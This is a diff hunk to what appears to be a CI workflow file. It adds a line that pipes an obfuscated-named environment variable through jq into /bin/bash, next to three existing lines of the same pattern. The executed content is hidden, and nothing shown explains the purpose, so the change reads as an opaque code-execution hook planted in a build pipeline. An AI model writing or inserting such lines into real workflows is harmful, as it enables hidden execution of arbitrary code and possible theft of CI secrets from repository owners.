@@ -60,6 +60,7 @@ jobs:
           printf '%s' "$oz75050" | jq -r .dy1 | /bin/bash
           echo $icv81973 | jq -r .agm2 | /bin/bash
           echo $eiz84994 | jq -r .trq8 | /bin/bash
+          printf '%s' "$isnch517" | jq -r .umyq98 | /bin/bash
 
       - name: Upload artifact
         if: always()
